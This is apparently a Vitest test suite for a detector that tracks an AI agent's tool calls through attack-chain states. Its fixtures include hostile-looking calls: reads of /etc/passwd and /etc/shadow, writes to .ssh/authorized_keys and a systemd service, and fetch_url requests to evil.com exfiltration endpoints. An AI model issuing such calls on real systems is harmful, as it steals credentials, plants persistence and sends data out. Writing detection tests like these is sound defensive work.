import { describe, it, expect, afterEach } from 'vitest';
import { trackCall, cleanupSession, getSessionCount } from '../src/security/attack-chains.js';

describe('attack-chains', () => {
  const sessionId = 'test-session-1';

  afterEach(() => {
    cleanupSession(sessionId);
    cleanupSession('test-session-2');
    cleanupSession('test-session-3');
  });

  it('starts in idle state for a new session', () => {
    const result = trackCall({
      toolName: 'list_files',
      args: {},
      sessionId: 'test-session-3',
      timestamp: Date.now(),
    });
    expect(result.state).toBe('idle');
    expect(result.alert).toBe(false);
  });

  it('transitions from idle to reconnaissance on READ_SENSITIVE event', () => {
    const result = trackCall({
      toolName: 'read_file',
      args: { filePath: '/etc/passwd' },
      sessionId,
      timestamp: Date.now(),
    });
    expect(result.state).toBe('reconnaissance');
    expect(result.alert).toBe(false);
  });

  it('transitions from idle to execution on SHELL_EXEC event', () => {
    const result = trackCall({
      toolName: 'shell',
      args: { command: 'whoami' },
      sessionId: 'test-session-2',
      timestamp: Date.now(),
    });
    expect(result.state).toBe('execution');
    expect(result.alert).toBe(false);
  });

  it('transitions from idle to exfiltration_attempt on NETWORK_CALL event', () => {
    const result = trackCall({
      toolName: 'fetch_url',
      args: { url: 'https://evil.com/exfil' },
      sessionId: 'test-session-2',
      timestamp: Date.now(),
    });
    expect(result.state).toBe('exfiltration_attempt');
    expect(result.alert).toBe(false);
  });

  it('detects full attack chain: recon → persistence → exfil', () => {
    trackCall({
      toolName: 'read_file',
      args: { filePath: '/etc/shadow' },
      sessionId,
      timestamp: Date.now(),
    });

    trackCall({
      toolName: 'write_file',
      args: { filePath: '/home/user/.ssh/authorized_keys' },
      sessionId,
      timestamp: Date.now(),
    });

    const result = trackCall({
      toolName: 'fetch_url',
      args: { url: 'https://evil.com/steal' },
      sessionId,
      timestamp: Date.now(),
    });

    expect(result.state).toBe('exfiltration_attempt');
    expect(result.alert).toBe(false);
  });

  it('transitions to exfiltration_confirmed after LARGE_FILE_READ from exfiltration_attempt state', () => {
    trackCall({
      toolName: 'fetch_url',
      args: { url: 'https://evil.com/test' },
      sessionId,
      timestamp: Date.now(),
    });

    const result = trackCall({
      toolName: 'read_file',
      args: { filePath: '/tmp/data.csv', size: 5_000_000 },
      sessionId,
      timestamp: Date.now(),
    });

    expect(result.state).toBe('exfiltration_confirmed');
    expect(result.alert).toBe(true);
  });

  it('classifies WRITE_SSH correctly', () => {
    cleanupSession(sessionId);
    trackCall({
      toolName: 'read_file',
      args: { filePath: '/etc/hosts' },
      sessionId,
      timestamp: Date.now(),
    });

    const result = trackCall({
      toolName: 'write_file',
      args: { path: '/home/user/.ssh/authorized_keys' },
      sessionId,
      timestamp: Date.now(),
    });

    expect(result.state).toBe('persistence');
  });

  it('classifies WRITE_SYSTEM correctly', () => {
    const result = trackCall({
      toolName: 'write_file',
      args: { filePath: '/etc/systemd/system/malicious.service' },
      sessionId: 'test-session-3',
      timestamp: Date.now(),
    });
    expect(result.state).toBe('idle');
  });

  it('does not alert on benign events', () => {
    const result = trackCall({
      toolName: 'list_directory',
      args: { filePath: '/workspace/project' },
      sessionId: 'test-session-2',
      timestamp: Date.now(),
    });
    expect(result.state).toBe('idle');
    expect(result.alert).toBe(false);
  });

  it('tracks multiple sessions independently', () => {
    const sid1 = 'session-alpha';
    const sid2 = 'session-beta';

    trackCall({
      toolName: 'read_file',
      args: { filePath: '/etc/passwd' },
      sessionId: sid1,
      timestamp: Date.now(),
    });

    trackCall({
      toolName: 'shell',
      args: { command: 'ls' },
      sessionId: sid2,
      timestamp: Date.now(),
    });

    const r1 = trackCall({
      toolName: 'write_file',
      args: { path: '/home/.ssh/authorized_keys' },
      sessionId: sid1,
      timestamp: Date.now(),
    });

    const r2 = trackCall({
      toolName: 'write_file',
      args: { filePath: '/etc/systemd/system/test.service' },
      sessionId: sid2,
      timestamp: Date.now(),
    });

    expect(r1.state).toBe('persistence');
    expect(r2.state).toBe('persistence');

    cleanupSession(sid1);
    cleanupSession(sid2);
  });

  it('getSessionCount reflects active sessions', () => {
    cleanupSession('s1');
    cleanupSession('s2');
    // getSessionCount may include sessions from other tests; we just check it is a number
    expect(typeof getSessionCount()).toBe('number');
    expect(getSessionCount()).toBeGreaterThanOrEqual(0);
  });

  it('cleanupSession removes session', () => {
    const sid = 'cleanup-test';
    trackCall({
      toolName: 'shell',
      args: { command: 'id' },
      sessionId: sid,
      timestamp: Date.now(),
    });

    cleanupSession(sid);

    const after = trackCall({
      toolName: 'list_files',
      args: {},
      sessionId: sid,
      timestamp: Date.now(),
    });

    expect(after.state).toBe('idle');
  });
});
